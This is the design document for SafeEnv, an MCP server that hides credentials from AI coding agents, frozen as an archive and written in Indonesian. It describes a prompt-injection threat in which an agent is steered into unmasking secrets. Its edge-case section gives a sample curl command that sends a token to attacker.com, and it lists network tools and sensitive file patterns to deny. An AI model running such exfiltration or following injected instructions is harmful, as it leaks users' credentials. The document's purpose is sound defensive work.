# Product Requirement Document (PRD): SafeEnv MCP Server

> ## 🧊 DOKUMEN HISTORIS — DIBEKUKAN (frozen)
>
> **Status: ARSIP RASIONALE DESAIN. BUKAN spesifikasi aktif.**
>
> SafeEnv sudah terimplementasi penuh (v1.0.0, M0–M3). **Kode adalah satu-satunya
> sumber kebenaran.** Dokumen ini disimpan HANYA untuk merekam *mengapa* keputusan
> desain diambil (threat model, confused-deputy, token acak vs hash, 1-proses-per-sesi,
> trade-off strict mode, dsb.) — yang mahal direkonstruksi dari kode.
>
> **Dokumen ini TIDAK lagi diselaraskan dengan kode.** Bila detail di sini berbeda
> dari implementasi, **kode yang benar**. Untuk perilaku & pemakaian terkini, lihat:
> - `README.md` — fitur, instalasi, arsitektur
> - `docs/CLIENT_CONFIG.md` — setup client, deny-selektif, allowlist
> - komentar/godoc di `internal/**` dan `cmd/safeenv` — kontrak sebenarnya
>
> Beberapa pernyataan "direncanakan/belum diimplementasikan" di bawah mungkin sudah
> usang (mis. human-in-the-loop kini punya 3 mode termasuk elicitation interaktif).
> Jangan jadikan dokumen ini acuan status fitur — cek kode.
>
> | Metadata | Nilai |
> | --- | --- |
> | Versi dokumen (beku) | 6.2 |
> | Dibekukan pada | 2026-10-08 |
> | Author | @hanifalkauni |
> | Produk | SafeEnv MCP Server (implementasi v1.0.0) |

---

## 1. Executive Summary

**SafeEnv MCP Server** adalah server Model Context Protocol (MCP) lokal yang berfungsi sebagai *privacy & security middleware* antara file/sistem operasi lokal dan model AI (LLM). Server menerapkan **Reversible Tokenization (Pseudonymization)** secara transparan: kredensial sensitif otomatis dimasking sebelum dikirim ke konteks LLM (*inbound*), dan direstorasi ke nilai asli saat dieksekusi kembali ke command line atau ditulis ke disk (*outbound*).

**Prasyarat keamanan inti (lihat §5.5, §6.1):** SafeEnv mengurangi permukaan
kebocoran dengan mengarahkan I/O sensitif lewat tool-nya. Efektivitasnya
bergantung pada client menegakkan **deny-selektif** tool bawaan pada file
sensitif (`.env`, `*.pem`, dsb.), atau **isolasi penuh** untuk jaminan zero-leak.
Tanpa deny semacam itu, tool bawaan client dapat membaca secret tanpa melewati
masking (bypass).

---

## 2. Problem Statement & User Persona

* **Problem:** Developer sering mengizinkan LLM/agentic AI (Claude Code, Cursor, Kiro, dsb.) membaca *workspace*, termasuk file `.env`, konfigurasi database, atau kredensial cloud. Hal ini menyebabkan kebocoran rahasia (*secret leakage*) ke log penyedia LLM atau riwayat percakapan.
* **Target User:** Software engineer dan backend developer yang menggunakan AI tools berbasis CLI/IDE dengan akses langsung ke filesystem dan terminal lokal.
* **Threat model:** SafeEnv melindungi dari **kebocoran pasif** (secret masuk ke konteks/log LLM). SafeEnv **tidak** secara default melindungi dari **penyalahgunaan aktif** (LLM yang terkena prompt-injection menyuruh server meng-unmask lalu mengirim secret keluar) — ini ditangani oleh kontrol di §5.6 dan §6.2, dan tetap merupakan risiko residual yang harus disadari pengguna.

---

## 3. Goals & Non-Goals

### Goals
* Mencegah **kebocoran pasif** secret ke konteks/log/riwayat LLM pada jalur baca (inbound).
* Memungkinkan LLM tetap produktif dengan secret termasking tanpa pernah melihat nilai asli.
* Merestorasi secret dengan benar pada jalur eksekusi/tulis lokal (outbound) di bawah policy keamanan.
* Zero-persistence: tidak ada secret yang menyentuh disk melalui SafeEnv.

### Non-Goals
* **Bukan** pengganti secret manager (Vault, AWS Secrets Manager, dsb.) — SafeEnv hanya middleware runtime.
* **Bukan** sandbox eksekusi penuh — tidak membatasi apa yang bisa dilakukan perintah lokal selain policy §5.6.
* **Tidak** melindungi bila client gagal menegakkan deny-selektif/isolasi tool bawaan pada file sensitif (§5.5) — itu di luar kendali server.
* **Tidak** menangani enkripsi at-rest (karena zero-persistence, tidak relevan).

---

## 4. User Stories

* **US-1:** Sebagai backend dev, saya ingin AI membaca `.env` saya tanpa nilai secret sungguhan masuk ke riwayat chat, agar aman bila riwayat tersimpan di penyedia LLM.
* **US-2:** Sebagai dev, saya ingin AI menulis file config berisi placeholder yang otomatis direstorasi ke secret asli saat ditulis ke disk, agar file lokal tetap fungsional.
* **US-3:** Sebagai dev, saya ingin AI menjalankan perintah lokal yang butuh secret (mis. `psql $DATABASE_URL`) tanpa pernah menampilkan URL asli ke konteks.
* **US-4 (keamanan):** Sebagai dev, saya ingin eksekusi dibatalkan bila LLM mencoba mengirim secret ke host eksternal, agar prompt-injection tidak bisa mengekstraksi kredensial saya.

---

## 5. Functional Requirements

### 5.1 Architecture & Data Flow

```
[ Local Files / Terminal ]
         ▲       │
  (Plain)│       │ (Plain Secrets)
         │       ▼
   ┌─────────────────────┐
   │ SafeEnv MCP Server  │ <---> In-Memory Ephemeral Vault
   └─────────────────────┘
         ▲       │
 (Masked)│       │ (Masked Tokens)
         │       ▼
   [ LLM Client / Agent ]
```

1. **Inbound Path (Read):**
   * LLM memanggil tool `safe_read_file` atau `safe_get_env`.
   * MCP server membaca konten mentah, memindai string sensitif via regex/pattern + parser `.env`.
   * Nilai rahasia disimpan di *vault* lokal dengan **token acak** (bukan hash dari nilai — lihat §5.2).
   * Konten yang dikembalikan ke LLM telah tersanitasi.

2. **Outbound Path (Write/Execute):**
   * LLM memanggil `safe_write_file` atau `safe_execute_command` dengan membawa token placeholder.
   * MCP server mencegat argumen, memvalidasi integritas token (§7), **mengevaluasi policy exfiltration (§5.6)**, memetakan kembali token ke nilai asli dari *vault*.
   * Jika policy lolos, perintah dieksekusi / file ditulis dengan nilai asli di lingkungan lokal.

### 5.2 Secret Detection & Masking Engine

* **Rule-based Regex Scanner:**
  * Provider API Keys (AWS, GitHub, OpenAI, Google, Stripe, Slack).
  * Standar Database URI (`postgres://`, `mysql://`, `redis://`, `mongodb://`).
  * Private Keys (`-----BEGIN RSA PRIVATE KEY-----`, SSH keys).
  * JWT tokens (`ey...`).
  * Kunci generik pada file konfigurasi (variabel dengan prefix/suffix `SECRET`, `PASSWORD`, `KEY`, `TOKEN`, `CREDENTIAL`).
  * **Sumber rule-set:** pinjam/port pola dari `gitleaks` dan/atau `detect-secrets`, bukan menulis regex dari nol.

* **Masking Format & Determinisme:**
  * Token **TIDAK diturunkan dari hash nilai asli**. Alasan: hash dari nilai berentropi rendah (`PASSWORD=admin123`) rentan brute-force/rainbow bila LLM mengetahui algoritmanya.
  * Token berbentuk **random/sekuensial per-vault-entry**: `__SAFE_SECRET_<RANDOM_ID>__` (mis. UUID-pendek atau counter+salt sesi).
  * **Determinisme per-sesi dicapai lewat reverse-map** (nilai→token yang sudah ada): nilai asli yang sama menghasilkan token yang sama dalam 1 sesi, tanpa membocorkan nilai lewat token.

### 5.3 Ephemeral Secret Vault

* **Storage:** strictly di RAM (*in-memory* hash map), dua arah: `token→secret` dan `secret→token`.
* **Persistence:** Tidak boleh ditulis ke disk (*zero-persistence*). Tidak boleh dicatat ke log, stdout, atau stderr dalam bentuk nilai asli.
* **TTL & Lifecycle:** Seluruh pemetaan otomatis hangus saat proses MCP server dihentikan (satu proses per sesi client).

### 5.4 MCP Tools Specification

| Tool Name | Input Parameters | Deskripsi & Behavior |
| --- | --- | --- |
| `safe_read_file` | `path: string` | Membaca file target, memindai secret (+ parser `.env` bila `.env*`), memetakan ke vault, mengembalikan teks termasking. |
| `safe_get_env` | `env_var?: string` | Membaca variabel environment sistem. Mengembalikan key-value dengan **value** termasking. **Catatan: nama variabel TIDAK dimasking** — struktur/nama env tetap terlihat LLM. |
| `safe_write_file` | `path: string`, `content: string` | Memvalidasi token placeholder, merestorasi ke secret asli, menulis file. |
| `safe_execute_command` | `command: string`, `cwd?: string` | Memvalidasi token, menjalankan **policy exfiltration (§5.6)**, unmasking, lalu eksekusi via shell runner lokal. |

### 5.5 Konfigurasi Client — Penutupan Jalur Bypass (requirement inti)

Server menyediakan dokumentasi + template konfigurasi per client untuk
mengarahkan I/O sensitif melewati SafeEnv dan menutup jalur bawaan ke secret.

**Temuan penegakan (terverifikasi Okt 2026):** men-*deny total* tool baca
bawaan (`fs_read`/Read) akan melumpuhkan agen — ia tak bisa membaca kode sama
sekali. Karena itu penegakan yang realistis adalah **deny-SELEKTIF**: tool
bawaan di-*deny* khusus pada file/jalur sensitif (`**/.env`, `**/.env.*`,
`**/*.pem`, `**/*.key`, `secrets/**`), sehingga agen terpaksa memakai SafeEnv
untuk itu, sementara baca kode non-sensitif tetap berjalan lewat tool bawaan.

Mekanisme per client (lihat `docs/CLIENT_CONFIG.md` untuk langkah lengkap):
* **Kiro:** `permissions.yaml` — `capability: fs_read/fs_write/shell`,
  `effect: deny` (deny-overrides); + Agent Autonomy = Supervised. Field MCP
  `disabledTools` TIDAK mematikan tool bawaan Kiro.
* **Claude Code:** `~/.claude/settings.json` → `permissions.deny`
  (`Read(./.env)`, dst.) sebagai hard gate (deny > ask > allow).
* **Cursor:** matikan tool filesystem/terminal bawaan via UI Settings (tak ada
  field file).

**Isolasi penuh (opsional, agresif):** untuk jaminan bahwa SEMUA I/O lewat
SafeEnv, deny seluruh baca/tulis/exec bawaan (mis. `shell`/`Bash(*)`). Hanya
tepat bila agen memang hanya boleh ber-I/O lewat SafeEnv.

**Batas jaminan (jujur):** SafeEnv **mengurangi permukaan kebocoran** pada
jalur sensitif; ia TIDAK menjamin zero-leak absolut kecuali isolasi penuh
diterapkan DAN client benar-benar menegakkan deny. Bila client tak menyediakan
deny yang memadai, model turun ke *best-effort + disclosure* (peringatan stderr
saat start). Dokumentasi deployment wajib menyatakan batas ini secara eksplisit.

### 5.6 Exfiltration / Confused-Deputy Policy (requirement inti)

Karena outbound unmasking adalah pisau bermata dua, `safe_execute_command` dan `safe_write_file` menjalankan policy sebelum unmask:
* **Egress allowlist:** blokir unmask bila token muncul di argumen perintah network keluar (`curl`, `wget`, `nc`, `ssh`, dan host/URL eksternal) kecuali host ada di allowlist pengguna.
* **Sink detection:** deteksi pola di mana token mengalir ke destinasi eksternal (query string URL, body request) dan tolak secara default.
* **Human-in-the-loop (DIRENCANAKAN, belum aktif di v1.0.0, lihat §13.2):** rencananya minta konfirmasi pengguna sebelum unmask-and-execute yang menyentuh jaringan. Saat ini jalur ini ditegakkan otomatis oleh egress allowlist + fail-closed, tanpa prompt.
* **Fail-closed:** bila policy ragu, batalkan dan kembalikan error deskriptif ke LLM — jangan unmask.

---

## 6. Non-Functional Requirements

### 6.1 Security & Isolation
* Vault token-mapping **tidak boleh** terekspos via tool MCP apa pun ke LLM. **Tidak boleh ada** tool `unmask_secret` yang dapat dipanggil LLM.
* **Deployment requirement:** client wajib menegakkan deny-selektif tool bawaan pada file sensitif (§5.5), atau isolasi penuh untuk jaminan zero-leak. Dokumen deployment menandai batas jaminan ini secara eksplisit.
* Nilai asli tidak pernah ditulis ke log/stdout/stderr.

### 6.2 Exfiltration Resistance
* Policy §5.6 wajib aktif pada jalur outbound. Risiko residual (secret dipakai sah oleh perintah lokal yang kebetulan juga punya efek jaringan) didokumentasikan untuk pengguna.

### 6.3 Performance
* Overhead latensi regex scanner < 50 ms untuk file < 1 MB.
* Untuk file > 1 MB: scanning tetap dilakukan secara streaming/chunked; bila ukuran melewati batas konfigurasi (default 10 MB), server mengembalikan error terkontrol alih-alih menggantung — behavior di luar batas harus terdefinisi, bukan undefined.

### 6.4 Compatibility
* Mendukung spesifikasi standar Model Context Protocol (JSON-RPC 2.0 via `stdio`).

### 6.5 Deterministic Replacement & Multi-substitution
* Mendukung substitusi ganda pada sub-string kompleks (mis. header curl: `-H "Authorization: Bearer __SAFE_SECRET_1__"`).
* Determinisme via reverse-map (§5.2), bukan hash nilai.

---

## 7. Edge Cases & Mitigations

* **LLM Truncation / Mutation:**
  * *Kasus:* placeholder terpotong/terformat ulang (mis. `__SAFE_SEC...`, line-break disisipkan).
  * *Mitigasi:* bila token outbound tidak cocok persis dengan tabel mapping, **abort** dan lempar error deskriptif: *"Error: Corrupted token placeholder detected."*
  * Gunakan delimiter token yang tahan reformat (hindari karakter yang di-escape markdown). Sertakan fuzzy-detection untuk melaporkan posisi token yang terpotong, bukan gagal diam.

* **Partial Secret Leak:**
  * *Kasus:* `.env` memuat secret acak di luar pola regex standar.
  * *Mitigasi:* parser khusus `.env` (`dotenv`). **Semua value** dari file berekstensi `.env*` wajib dimasking by default tanpa bergantung pada regex matching.

* **Active Exfiltration via Outbound Unmask:**
  * *Kasus:* `safe_execute_command("curl https://attacker.com/?leak=__SAFE_SECRET_1__")` → server patuh meng-unmask → secret terkirim ke attacker.
  * *Mitigasi:* egress allowlist + sink detection + optional human confirmation + fail-closed (§5.6).

* **Token Guessing:**
  * *Kasus:* token diturunkan dari hash nilai berentropi rendah → brute-force.
  * *Mitigasi:* token acak + reverse-map (§5.2).

---

## 8. Tech Stack Recommendation

* **Runtime (direkomendasikan):** **Go** — binary tunggal, footprint RAM kecil (relevan karena vault di RAM), tanpa dependency runtime. (Node.js/TypeScript tetap viable sebagai alternatif.)
* **SDK:** `mcp-go` (mark3labs/mcp-go) untuk Go, atau `@modelcontextprotocol/sdk` untuk TypeScript.
* **Regex Engine / Scanner:** port rule-set dari `gitleaks` atau `detect-secrets`.
* **`.env` parsing:** library dotenv native sesuai runtime.

---

## 9. Scope MVP

MVP minimal untuk membuktikan nilai inti (~1–2 hari):
1. `safe_read_file` + parser `.env` + masking engine (reverse-map, token acak).
2. `safe_get_env`.
3. In-memory vault dua-arah.
4. Dokumentasi konfigurasi client untuk deny-selektif tool bawaan pada file sensitif (§5.5) — tanpa ini MVP tidak aman untuk dipakai nyata.

Fase berikutnya: `safe_write_file`, `safe_execute_command`, dan policy exfiltration §5.6.

---

## 10. Audit Log Specification

Audit log mencatat **kejadian keamanan**, bukan nilai secret. Prinsip: *catat metadata, jangan pernah plaintext*.

* **Format:** JSON Lines (JSONL) — satu event per baris, append-only, mudah di-grep/stream/parse.
* **Lokasi:** file lokal per sesi, mis. `.safeenv/audit/<session_id>.jsonl`. **Bukan** stdout (stdout dipakai transport MCP stdio).

### Skema Event
```json
{
  "ts": "2026-10-07T16:08:40.441+07:00",
  "event_id": "uuid-v4",
  "session_id": "sess-abc123",
  "event_type": "mask | unmask | abort | policy_block | read | write | execute | consent | config_reload",
  "tool": "safe_read_file | safe_get_env | safe_write_file | safe_execute_command",
  "actor": "llm_client",
  "resource": { "path": "/proj/.env", "cwd": "/proj" },
  "secret_ref": {
    "token": "__SAFE_SECRET_7F3A__",
    "value_fingerprint": "sha256:ab12…(trunc)",
    "value_len": 36,
    "detector": "dotenv | regex:aws_key | regex:jwt"
  },
  "decision": "allow | deny | abort",
  "reason": "egress_host_not_in_allowlist | corrupted_token | ok",
  "policy": { "egress_host": "attacker.com", "allowlist_hit": false },
  "severity": "info | warning | critical",
  "duration_ms": 12
}
```

### Aturan Mengikat (NFR audit)
* **Zero plaintext:** nilai asli dilarang muncul. Hanya `value_fingerprint` (SHA-256 terpotong) + `value_len`. Fingerprint cukup untuk korelasi "secret yang sama" lintas event tanpa membocorkan nilai.
* **Severity routing:** `policy_block` & `abort` → `warning`/`critical` dan selalu dicatat; event rutin boleh diringkas.
* **Tamper-evident (DIIMPLEMENTASIKAN, default-ON di v1.0.0):** hash-chain antar entri (`prev_hash`) agar penghapusan/penyuntingan terdeteksi. Diaktifkan via `audit.Options{HashChain:true}` di composition root.
* **Redaction self-test (startup):** assertion bahwa serializer tidak dapat menulis plaintext ke log.
* **Event tercatat saat ini (v1.0.0):** `policy_block`, `abort`, `execute` (dari `safe_execute_command`). **Belum tersambung:** `read`/`mask` (handler read/get_env), `write` (handler write), `consent`, `config_reload` — skema mendukungnya tetapi handler belum memanggilnya (pekerjaan lanjutan).

---

## 11. Success Metrics / Acceptance Criteria

| Metrik | Target |
| --- | --- |
| **Zero-leak inbound** | 0 secret asli muncul di output tool mana pun pada test corpus (`.env`, config, key files). |
| **Detection recall** | ≥ 95% secret pada test corpus terdeteksi & termasking. |
| **Round-trip integrity** | 100% token yang utuh direstorasi ke nilai asli yang benar; token korup → abort (0 unmask salah). |
| **Exfiltration blocked** | 100% percobaan kirim token ke host non-allowlist diblokir oleh policy §5.6. |
| **Zero-persistence** | 0 byte nilai asli ditemukan di disk/log/stderr setelah sesi (diverifikasi via scan). |
| **Latency** | < 50 ms scan untuk file < 1 MB (§6.3). |

---

## 12. Testing & Validation Plan (wajib untuk produk security)

* **Unit:** regex/parser `.env`, masking/unmasking, reverse-map determinisme, integritas vault.
* **Round-trip:** read → masking → (simulasi mutasi LLM) → write/execute → verifikasi nilai asli benar atau abort.
* **Adversarial / red-team (kritis):**
  * Prompt-injection yang menyuruh exfiltrasi token ke host eksternal → harus diblokir (§5.6).
  * Token truncation/mutation → harus abort dengan error deskriptif (§7).
  * Token guessing dari hash → dibuktikan tidak mungkin karena token acak (§5.2).
  * Percobaan memanggil tool I/O bawaan client untuk bypass → didokumentasikan sebagai gap yang hanya tertutup oleh deny-selektif/isolasi di §5.5.
* **Leak-scan:** setelah sesi, scan disk/log untuk memastikan tidak ada nilai asli yang bocor.
* **Compatibility:** uji handshake MCP (JSON-RPC 2.0 via stdio) dengan minimal 1 client nyata (mis. Kiro).

---

## 13. Design Decisions

### 13.1 Penegakan §5.5 (deny-selektif tool bawaan client)
**Keputusan:** server **tidak memaksa** (di luar kendali MCP); gunakan pola **guided-config + explicit consent + risk disclosure**, dengan **deny-selektif** sebagai target penegakan (bukan deny total yang melumpuhkan agen).
* **Deteksi (best-effort):** cek capability client saat handshake bila diekspos; MCP standar tidak menjamin server tahu tool bawaan client, jadi deteksi penuh tidak selalu mungkin.
* **Config deklaratif per client (terverifikasi Okt 2026):** sediakan template + langkah deny-selektif pada file sensitif:
  * Kiro — `permissions.yaml` (`fs_read/fs_write/shell` + `effect: deny`, deny-overrides) + Agent Autonomy = Supervised. `disabledTools` MCP tidak mematikan tool bawaan Kiro.
  * Claude Code — `~/.claude/settings.json` → `permissions.deny` (hard gate).
  * Cursor — UI Settings (tak ada field file).
* **Startup consent + warning:** saat pertama jalan, tampilkan status *"Tool I/O bawaan client tidak dapat diverifikasi mati — jika aktif pada file sensitif, secret dapat bocor lewat jalur itu"* + daftar efek samping. Minta konfirmasi lanjut (`y/N`, default N / fail-safe).
* **Batas jaminan:** deny-selektif mengurangi permukaan kebocoran pada jalur sensitif; zero-leak absolut hanya tercapai dengan isolasi penuh DAN penegakan client yang benar.

### 13.2 Human-in-the-loop (§5.6)
**Keputusan: direncanakan default-ON, BELUM diimplementasikan (per v1.0.0).**
Status kode saat ini: jalur outbound ditegakkan oleh **egress allowlist +
sink detection + fail-closed** (otomatis, tanpa prompt manusia). Konfirmasi
interaktif per-eksekusi belum ada karena transport MCP stdio tidak punya kanal
prompt interaktif bawaan — ini pekerjaan lanjutan (butuh elicitation/approval
channel dari client). Sampai itu ada, friksi ditekan lewat per-host allowlist,
dan keamanan outbound bersandar pada allowlist fail-closed, bukan konfirmasi.

### 13.3 Egress Allowlist
**Keputusan: bertingkat (layered).**
* `global`: host yang selalu dipercaya (file config user-level).
* `per-project`: host khusus proyek (mis. `.safeenv/allowlist` di root project).
* **Resolusi:** `effective = global ∪ per-project` (union), default.
* **Strict mode → DIIMPLEMENTASIKAN (v1.0.0/M2).** Diaktifkan via env `SAFEENV_STRICT_ALLOWLIST=1`: per-project **mempersempit** global → `effective = global ∩ per-project`; bila project kosong, fallback ke global. Default tetap union (fail-closed: host tak dikenal diblokir). Konstruktor `allowlist.NewLayered(ttl, strict, global, project)`.

### 13.4 Multi-sesi / Multi-client dalam satu proses
**Keputusan: TIDAK — pertahankan 1 proses per sesi.**
* Isolasi vault per-sesi adalah **fitur keamanan**: kebocoran/kompromi satu sesi tidak menyebar ke sesi lain (blast radius minimal).
* Vault bersama antar-sesi akan memungkinkan secret proyek A ter-unmask di sesi proyek B → ditolak.
* Trade-off (token tidak konsisten antar editor, memori sedikit lebih besar) dapat diterima demi isolasi.

### 13.5 Refresh Allowlist Tanpa Restart
**Keputusan: ya — baca-ulang file config = refresh allowlist**, dengan reload yang aman-konkurensi.
* **(MVP) Lazy reload berbasis `mtime` / TTL cache:** cek `mtime` file allowlist sebelum evaluasi egress (atau cache TTL ~5 dtk); jika berubah → parse ulang → swap. Sederhana, cukup, tanpa thread tambahan.
* **(M2) File watcher (fsnotify):** reload reaktif on-change; lebih responsif, menambah dependency.
* **Syarat aman (wajib):**
  * **Atomic swap:** parse ke map baru lalu ganti pointer dalam satu operasi — jangan mutasi map yang sedang dipakai (hindari race / allowlist setengah-termuat).
  * **Validate-before-swap (fail-safe):** jika file baru invalid, **pertahankan allowlist lama** + catat `config_reload` warning — jangan jatuh ke allowlist kosong atau crash.
  * **Audit:** tiap reload tercatat sebagai event `config_reload` (§10).

---

## 14. Milestones / Roadmap

| Fase | Isi | Estimasi |
| --- | --- | --- |
| **M0 — MVP** | `safe_read_file`, `safe_get_env`, vault dua-arah, masking engine, dok §5.5 | ~1–2 hari |
| **M1 — Outbound** | `safe_write_file`, `safe_execute_command`, policy exfiltration §5.6 | ~2–3 hari |
| **M2 — Hardening** | adversarial test suite, leak-scan otomatis, human-in-the-loop confirmation, audit log hash-chain (§10), strict allowlist mode (§13.3) | ~2 hari |
| **M3 — Integrasi** | template config per client (Kiro/Cursor/Claude Code), rilis binary | ~1–2 hari |

---

## 15. Open Questions & Future Work

* **Human-in-the-loop (§5.6/§13.2):** belum diimplementasikan — butuh kanal approval/elicitation dari client MCP. Saat ini outbound bersandar pada allowlist fail-closed.
* **Audit coverage:** sambungkan event `read`/`mask` (read/get_env), `write` (write), dan `config_reload` (reload allowlist) ke handler terkait; saat ini hanya jalur execute yang mencatat.
* Rotasi/retensi file audit log untuk sesi yang panjang.
* Dukungan allowlist berbasis pola (wildcard subdomain) selain host eksak.

---

## 16. Glossary

* **MCP (Model Context Protocol):** protokol standar JSON-RPC 2.0 untuk tool/konteks LLM.
* **Reversible Tokenization / Pseudonymization:** mengganti nilai sensitif dengan placeholder yang dapat dipulihkan.
* **Vault:** penyimpanan pemetaan token↔secret in-memory, zero-persistence.
* **Inbound / Outbound:** arah baca (ke LLM, termasking) vs tulis/eksekusi (dari LLM, direstorasi).
* **Confused Deputy:** server tepercaya disalahgunakan oleh pihak kurang tepercaya (LLM) untuk melakukan aksi istimewa (unmask secret).
* **Fail-closed:** bila ragu, tolak/batalkan — bukan izinkan.
